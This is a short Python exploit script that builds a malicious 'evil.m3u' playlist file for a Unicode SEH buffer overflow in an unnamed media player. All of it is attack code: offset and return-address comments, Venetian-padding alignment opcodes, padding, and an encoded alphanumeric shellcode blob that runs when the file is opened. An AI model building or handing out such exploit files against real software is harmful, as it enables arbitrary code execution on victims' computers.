#!/usr/bin/python -w

# 
# SEH offset is 536
# total payload is 5000
# pop eso pop ebx ret 0x04 (unicode)004100F2

filename = "evil.m3u"

shellcode = (
"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQA"
"IAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZAB"
"ABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30AP"
"B944JBKLK8SRM0M0KP1PSYJENQGPS44KPPP04K22L"
"L4KQBLT4KT2MXLOX7OZMVNQKOVLOL1QSLKRNLMP7Q"
"8OLMKQY7YRJR22R7DKR2LP4KPJOL4KPLLQBXK3Q8M"
"1Z121TKPYMPKQHS4K19N8K3OJOY4KP44KM1J6NQKO"
"6LWQHOLMKQXGP89PT5L6LC3ML8OKSMMT2UJD0XTKR"
"8MTM1XSS6DKLLPKTKPXMLM1ICDKKTTKM18PCYQ4ND"
"O4QK1KQQPY1JR1KOK0QOQOPZTKMBJKTMQM2HNSOBK"
"PKPQXSGT3NRQO1DQXPLRWO6KWKOYEVX4PM1KPKPO9"
"7T0TPPRHMY50BKKPKOIEB0PPPPPPQ0R0Q0PPS8YZL"
"OYOIPKOXU5GBJLE387PUXLOCYS8LBM0LQQL59JFRJ"
"N0R6PWS84YUUD431KOYECUGPRTLLKO0NKXRUZLRHZ"
"P6UVBQFKOXU38C3RMBDKPSY9S27PW1GNQL62JN20Y"
"B6K2KM1VI70DMTOLKQKQ4MQ4O4LP96M0OTB4R0B6R"
"626OV26PNQFPVQC0VS82YXLOO56KOZ5U9K00N26OV"
"KONPQXM8SWMMQPKOHU7KL06U5RPVQXUVF57MUMKOJ"
"5OLKV3LKZSPKKYP3EKUWKOWMC2R2OQZKP0SKOYEA"
)

align =(
"\x55"                      #push EBP   
"\x71"                      #Venetian Padding
"\x58"                      #pop EAX
"\x71"                      #Venetian Padding
"\x05\x20\x11"              #add eax,0x11002000  \
"\x71"                      #Venetian Padding     |> +300
"\x2d\x17\x11"              #sub eax,0x11001700  /
"\x71"                      #Venetian Padding
"\x50"                      #push EAX
"\x71"                      #Venetian Padding
"\xC3"                     #RETN
)


SEH = "\x41\x71" + "\xF2\x41" # has to be harmless code


buffer = "\x58" * 117 # Got this by putting a 500 byte pattern after align, 
                      # then finding the 4 chars at 12BC5C (where EAX returns to)

payload = SEH + align + buffer + shellcode

                      
# the nSEH and SEH are two bytes because its unicode, 
# and then there is a 2 byte padded buffer to bypass,
# which is why the D's are 4462 
buffer = "\x90" * 536 + payload + "B" * (4466 - len(payload))

textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()